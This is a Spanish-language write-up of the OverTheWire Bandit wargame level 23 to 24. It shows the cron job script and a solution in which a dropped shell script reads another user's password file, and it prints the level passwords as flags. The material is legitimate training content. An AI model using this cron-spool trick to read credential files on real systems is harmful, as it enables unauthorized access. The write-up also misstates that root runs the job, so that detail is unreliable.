#Bandit Level 23 → Level 24

##Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

##Commands you may need to solve this level

cron, crontab, crontab(5) (use “man 5 crontab” to access this)

## Write Up Iker

La contraseña la hemos sacado en el anterior apartado:

**FLAG** = {jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n}

Utilizamos esta contraseña para acceder al siguiente nivel.

```bash 
$ ssh bandit23@bandit.labs.overthewire.org
```

Nos conectamos a la prueba y analizamos como se comporta el programa o Job de **Cron**

```bash
bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 "./$i"
	rm -f "./$i"
    fi
done
```

El enunciado nos dice que tenemos que crear nuestro primer script en Bash y que debemos tenemos una copia nosotros.

Observamos que dentro del fichero **/usr/bin/cronjob_bandit24.sh** tenemos un código que tenemos que analizar/saber que es lo que hace para empezar con el reto. 

Vemos que el usuario quien lo ejecuta los scripts es **root**

```bash
-rw-r--r-- 1 root root  61 May  3  2015 cronjob_bandit24
```

Vemos que ejecuta todos los scripts del directorio **/var/spool/$myname** por lo que podemos crear un script y copiarlo a ese directorio para obtener la contraseña que estará en la ruta **/etc/bandit_pass/bandit24**

```bash
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
```

Vamos a crear el script y vamos a ubicarlo en la ruta donde **Cron** ejecuta la tarea, que es **/var/spool/$myname**

Lo llamaremos **damelapass.sh**

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/iker24
```

Le cambiamos los permisos para que se pueda ejecutar con cualquier usuario y lo copiamos a la carpeta que nos han dicho


```bash
bandit23@melinda:/tmp$ nano damelapass.sh
bandit23@melinda:/tmp$ chmod 777 damelapass.sh  
bandit23@melinda:/tmp$ cp damelapass.sh /var/spool/bandit24
```

Copiando el script a la carpeta **/var/spool/bandit24** la variable **myname=$(whoami)** del script **/usr/bin/cronjob_bandit24.sh** tendrá el valor del usuario **bandit24** haciendo que se ejecute entre otros script el nuestro que hemos creado.

Hacemos un ```cat ```a la variable que hemos creado y obtenemos la pass

```bash
bandit23@melinda:/tmp$ file iker24
iker24: ASCII text
bandit23@melinda:/tmp$ cat iker24
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

**FLAG** = {UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ}

NOTA= Después de cambiarle los permisos y copiar el fichero al directorio bandit24, tenemos que esperar un tiempo **timeout -s 9 60 "./$i"** hasta que cree el fichero en el directorio que le hayamos asignado. Luego el propio script elimina los scripts que hemos creado incluido el nuestro.


